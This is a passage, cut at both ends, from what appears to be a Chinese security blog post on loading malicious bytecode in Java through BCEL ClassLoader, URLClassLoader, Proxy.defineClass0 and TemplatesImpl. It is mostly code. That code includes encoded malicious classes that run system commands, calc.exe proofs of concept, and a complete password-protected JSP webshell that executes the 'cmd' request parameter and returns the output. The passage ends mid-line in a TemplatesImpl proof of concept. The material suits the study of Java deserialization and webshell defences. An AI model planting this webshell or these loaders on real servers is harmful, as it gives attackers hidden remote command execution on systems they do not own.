 Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> constructor.newInstance(cmd).toString();</span><br><span class="line">    response.getWriter().print(result);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220312002047.png"></p><h2 id="0x02-BECL-ClassLoader"><a href="#0x02-BECL-ClassLoader" class="headerlink" title="0x02 BECL ClassLoader"></a>0x02 BECL ClassLoader</h2><blockquote><p>BCEL 的全名为 Apache Commons BCEL，属于 Apache Commons 项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 JAXP 的实现，所以 BCEL 也被包含在了 JDK 的原生库中。</p></blockquote><p>根据P神的文章 <a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</a></p><p>在 Java 8u251以前，都是可以使用的</p><p>同理，我们也需要获取<code>BECL</code>的字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.Evil.ByteCodeEvil;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetBecl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(ByteCodeEvil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 BCEL 提供的两个类 <code>Repository</code> 和 <code>Utility</code>，先将<code>JAVAClass</code>转换成原生字节码，使用其他类获取字节码也可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">      <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(ByteCodeEvil.class.getName());</span><br><span class="line">      <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(clazz.toBytecode(),<span class="literal">true</span>);</span><br><span class="line">      System.out.println(code);</span><br></pre></td></tr></table></figure><p>如图，将会获得<code>Becl</code>字节码</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220312093020.png"></p><p>动态调试<code>loadClass</code>发现，会判断加载的字节码是否以<code>$$BCEL$$</code>开头</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>则编写测试类，继续以0x01中的恶意类为基础，可以实现命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Becl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">bcelCode</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$5bO$TA$U$fe$a6$5d$3aeY$u$z$b7$e2$5d$U$v$a5$b0$5e$f0F$R$b4$I$88$W0$600$7d$dcn$H$5clw$9b$ed$96$e0$_$f2U$Tm$8d$q$3e$fa$e0$a3$3f$c3$df$60$c43$dbri$a81$cd$9e$99s$99s$be$f3$cd$99$fe$f8$f3$f5$h$80i$ac$a9$88$o$c51$a9$o$m$d7$v$O$5d$c5M$dc$92$e2$b6$8a$3b$98V$d1$81$bb$w$U$dc$93$e2$be$M$7c$Q$c6C$b9$cet$a2$Xi$8eY$8eG$MAWT$Yb$d9$5dc$cf$d0$8b$86$bd$a3oz$aee$ef$a4$ZB$b3$96mys$M$D$89$b3$ee$f1$z$Ge$c1$v$I$86H$d6$b2$c5Z$b5$94$X$ee$x$p_$U2$9dc$g$c5$z$c3$b5$a4$de4$w$de$h$8bJ$NeM$a7$a4$_$eeYE$3d$f3$ce$T2$85T$a8$5e$d0$y$V$Y$ba$x$7e$81L$d5$w$W$84$cb0$7c$a6v$d3E$tz$f2$d5$edm$e1$8a$c2$860$fc$e0x$p$d8r$f4L$8b$87b$95$o$a1$a4$f4$9b$9ea$be$5d5$ca$3e$w$9f$859b$92HdP$X$f7MQ$f6$y$c7$aep$cc3$84$3d$a7Q$91$a1$3f1$de$8e$ou$d3$a9$ba$a6X$b2d$83$d1$d3$fdL$c9h$N$fdxL$z$ff$a3$D$86$c1$f6p$a9$eb$p$c7$8a$5d$aeztJ$Y$a5$86$8f$e3$89$86$M$W4$3c$c5$o$c7$92$86e$3c$93$85V$a4x$ae$e1$F$c65d$b1$ca$c0T$N$J$a9$c5$d0G$b7$d8$96w$86$de$Tt$eb$f9$5daz$z$a6$p$C$fa$8e$B$ad$l$b3DW$96$90s$Q$3d$J$df$a8$da$9eU$o2$d4$j$e1$j$x$D$z$ec5$cd$f2N$c4$be0$Z$c6$da$cd$d7$v$d3K$d71E$a5$92n$a9$d44$d2$QP$a5S$y$R$ddG$d5Z$e9$a3$e3$f1D$5b$87$ec$a1$ef$c4$d5$i$Zi$N$93$bf$90$f5$H$td$94$cb$c2$a6$B$9d$fc$P$da$d6$n$c5UzmQz$b6$8c$3e$ba$H$92$B$da$f7c$80$d6A$d2$7e$oDo$VXN$d6$c1$O$Q$c8$d5$R$5c$3d$80$92$3b$40G$ee$LB$T5$f0$g$c2ut$d6$a1$aeM$d6$d0$95$9bQ$be$p$96$gVj$d0b$dd$q$5e$bf$3f$fc$95L$d5$d0$f3$Z$91$8f$94$w$88$n$92$97$c0Iv$d2$f3$ef$82F$bfQ$f4$40G$Es$Eg$89$a0$c4$fd$ff$S$bf4$86q$O$f0w$e7$J$o$a3$e84$$$e0$oA$i$c5$Ie$baL9S$e4$bbB$5e$85Z$C$ed$D$87$e4T8F8$aeq$5c$e7$a4$e17$e2$a4$e1$G$F$u$94f$8c$3e$g$40$92$b2S$9dV$c9BG$f2$T$o$l$7c$o$q$ce$90o$i$f2$f1h$8d$80$s$k$86$a4$l5$f1$X$9c5$85$b0$fa$E$A$A&quot;</span>;</span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (ClassLoader) c.newInstance();</span><br><span class="line">        Class&lt;?&gt; clazz = loader.loadClass(bcelCode);</span><br><span class="line">        java.lang.reflect.Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(cmd);</span><br><span class="line">        System.out.println(obj.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理，也可以将输入输出替换为内置对象，做一个jsp马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%! <span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">pwd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pwd.equals(PASSWORD)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">bcelCode</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$5bO$TA$U$fe$a6$5d$3aeY$u$z$b7$e2$5d$U$v$a5$b0$5e$f0F$R$b4$I$88$W0$600$7d$dcn$H$5clw$9b$ed$96$e0$_$f2U$Tm$8d$q$3e$fa$e0$a3$3f$c3$df$60$c43$dbri$a81$cd$9e$99s$99s$be$f3$cd$99$fe$f8$f3$f5$h$80i$ac$a9$88$o$c51$a9$o$m$d7$v$O$5d$c5M$dc$92$e2$b6$8a$3b$98V$d1$81$bb$w$U$dc$93$e2$be$M$7c$Q$c6C$b9$cet$a2$Xi$8eY$8eG$MAWT$Yb$d9$5dc$cf$d0$8b$86$bd$a3oz$aee$ef$a4$ZB$b3$96mys$M$D$89$b3$ee$f1$z$Ge$c1$v$I$86H$d6$b2$c5Z$b5$94$X$ee$x$p_$U2$9dc$g$c5$z$c3$b5$a4$de4$w$de$h$8bJ$NeM$a7$a4$_$eeYE$3d$f3$ce$T2$85T$a8$5e$d0$y$V$Y$ba$x$7e$81L$d5$w$W$84$cb0$7c$a6v$d3E$tz$f2$d5$edm$e1$8a$c2$860$fc$e0x$p$d8r$f4L$8b$87b$95$o$a1$a4$f4$9b$9ea$be$5d5$ca$3e$w$9f$859b$92HdP$X$f7MQ$f6$y$c7$aep$cc3$84$3d$a7Q$91$a1$3f1$de$8e$ou$d3$a9$ba$a6X$b2d$83$d1$d3$fdL$c9h$N$fdxL$z$ff$a3$D$86$c1$f6p$a9$eb$p$c7$8a$5d$aeztJ$Y$a5$86$8f$e3$89$86$M$W4$3c$c5$o$c7$92$86e$3c$93$85V$a4x$ae$e1$F$c65d$b1$ca$c0T$N$J$a9$c5$d0G$b7$d8$96w$86$de$Tt$eb$f9$5daz$z$a6$p$C$fa$8e$B$ad$l$b3DW$96$90s$Q$3d$J$df$a8$da$9eU$o2$d4$j$e1$j$x$D$z$ec5$cd$f2N$c4$be0$Z$c6$da$cd$d7$v$d3K$d71E$a5$92n$a9$d44$d2$QP$a5S$y$R$ddG$d5Z$e9$a3$e3$f1D$5b$87$ec$a1$ef$c4$d5$i$Zi$N$93$bf$90$f5$H$td$94$cb$c2$a6$B$9d$fc$P$da$d6$n$c5UzmQz$b6$8c$3e$ba$H$92$B$da$f7c$80$d6A$d2$7e$oDo$VXN$d6$c1$O$Q$c8$d5$R$5c$3d$80$92$3b$40G$ee$LB$T5$f0$g$c2ut$d6$a1$aeM$d6$d0$95$9bQ$be$p$96$gVj$d0b$dd$q$5e$bf$3f$fc$95L$d5$d0$f3$Z$91$8f$94$w$88$n$92$97$c0Iv$d2$f3$ef$82F$bfQ$f4$40G$Es$Eg$89$a0$c4$fd$ff$S$bf4$86q$O$f0w$e7$J$o$a3$e84$$$e0$oA$i$c5$Ie$baL9S$e4$bbB$5e$85Z$C$ed$D$87$e4T8F8$aeq$5c$e7$a4$e17$e2$a4$e1$G$F$u$94f$8c$3e$g$40$92$b2S$9dV$c9BG$f2$T$o$l$7c$o$q$ce$90o$i$f2$f1h$8d$80$s$k$86$a4$l5$f1$X$9c5$85$b0$fa$E$A$A</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (ClassLoader) c.newInstance();</span><br><span class="line">    Class&lt;?&gt; clazz = loader.loadClass(bcelCode);</span><br><span class="line">    java.lang.reflect.Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(cmd);</span><br><span class="line">    <span class="comment">// 回显</span></span><br><span class="line">    response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    response.getWriter().print(obj.toString());</span><br><span class="line">    response.getWriter().print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Fastjson的BasicDataSource利用"><a href="#Fastjson的BasicDataSource利用" class="headerlink" title="Fastjson的BasicDataSource利用"></a>Fastjson的<code>BasicDataSource</code>利用</h3><h2 id="0x03-URLClassLoader"><a href="#0x03-URLClassLoader" class="headerlink" title="0x03 URLClassLoader"></a>0x03 URLClassLoader</h2><p>URLClassLoader可以加载任意路径下的类</p><p>有点类似于<code>RMI</code>和<code>LDAP</code>下的远程加载恶意类的方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">        Class&lt;?&gt; clazz = loader.loadClass(<span class="string">&quot;ByteCodeEvil&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">        constructor.newInstance(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将0x01中的恶意类的<code>java</code>文件，放置在文件夹中，(将包名除去)，重新编译为<code>class</code>文件，然后使用python开一个<code>HTTP</code>服务</p><p>同理，使用内置对象替换，也可以作为<code>jsp</code>马 (这里4ra1n师傅将恶意类打包成jar包了)</p><h2 id="0x04-defineClass0"><a href="#0x04-defineClass0" class="headerlink" title="0x04 defineClass0"></a>0x04 defineClass0</h2><p>这里的<code>defineClass0</code>，是基于<code>Proxy</code>的<strong>native</strong>方法，使用到的<code>Proxy</code>类是Java动态代理的底层实现类。也许可以绕过一些防御。</p><p>在<code>java.lang.reflect.Proxy</code>中有这么一个方法，里面没有定义任何方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> Class&lt;?&gt; defineClass0(ClassLoader loader, String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.proxy_define0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Define0_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; defineByProxy(String className, <span class="type">byte</span>[] classBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取系统的类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="comment">// 反射java.lang.reflect.Proxy类获取其中的defineClass0方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Proxy.class.getDeclaredMethod(<span class="string">&quot;defineClass0&quot;</span>,ClassLoader.class, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">// 修改方法的访问权限</span></span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 反射调用java.lang.reflect.Proxy.defineClass0()方法</span></span><br><span class="line">        <span class="comment">// 动态向JVM注册对象</span></span><br><span class="line">        <span class="comment">// 返回一个 Class 对象</span></span><br><span class="line">        <span class="keyword">return</span> (Class&lt;?&gt;) method.invoke(<span class="literal">null</span>, classLoader, className, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxjb20vQnl0ZUNvZGVFdmlsOwEAA2NtZAEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcALgEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAEUJ5dGVDb2RlRXZpbC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBBDABCAEMMAEQARQcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAEGNvbS9CeXRlQ29kZUV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7ACEAEAARAAAAAQAAABIAEwAAAAIAAQAUABUAAgAWAAAA0gAGAAUAAABHKrcAAbsAAlm3AANNuwAEWbsABVm4AAYrtgAHtgAItwAJtwAKTi22AAtZOgTGABIsGQS2AAwSDbYADFen/+oqLLYADrUAD7EAAAADABcAAAAeAAcAAAAJAAQACwAMAAwAJQAOAC8ADwA+ABEARgASABgAAAA0AAUAAABHABkAGgAAAAAARwAbABMAAQAMADsAHAAdAAIAJQAiAB4AHwADACwAGwAgABMABAAhAAAAGwAC/wAlAAQHACIHACMHACQHACUAAPwAGAcAIwAmAAAABAABACcAAQAoACkAAQAWAAAALwABAAEAAAAFKrQAD7AAAAACABcAAAAGAAEAAAAXABgAAAAMAAEAAAAFABkAGgAAAAEAKgAAAAIAKw==&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; testClass = defineByProxy(<span class="string">&quot;com.ByteCodeEvil&quot;</span>, bytes);</span><br><span class="line">        Constructor&lt;?&gt; constructor = testClass.getConstructor(String.class);</span><br><span class="line">        constructor.newInstance(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x05-TemplateImpl"><a href="#0x05-TemplateImpl" class="headerlink" title="0x05 TemplateImpl"></a>0x05 TemplateImpl</h2><p>这个类用的比较多一些，例如CC链、Fastjson、7U21</p><p>开发者不会直接使用到 defineClass 方法，但是，Java 底层还是有一些类用到了它，如：<code>TemplatesImpl</code>。</p><p>在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 这个类中定义了一个内部类 <code>TransletClassLoader</code> ，这个类里重写了 <code>defineClass</code> 方法，并且这里没有显式地声明其定义域。Java 中默认情况下，如果一个方法没有显式声明作用域，其作用域为 default。因此，这里被重写的 defineClass 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。</p><p>其中<code>TransletClassLoader#defineClass()</code>可以如下追溯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">-&gt; TemplatesImpl#newTransformer()</span><br><span class="line">-&gt; TemplatesImpl#getTransletInstance() </span><br><span class="line">-&gt; TemplatesImpl#defineTransletClasses() </span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>其中，前两个方法<code>TemplatesImpl#getOutputProperties()</code> 、 <code>TemplatesImpl#newTrans</code>，他们的作用域是<code>public</code>，可以尝试呗外部调用。尝试用 <code>newTransformer()</code> 构造一个简单的 POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Template;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tem_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span 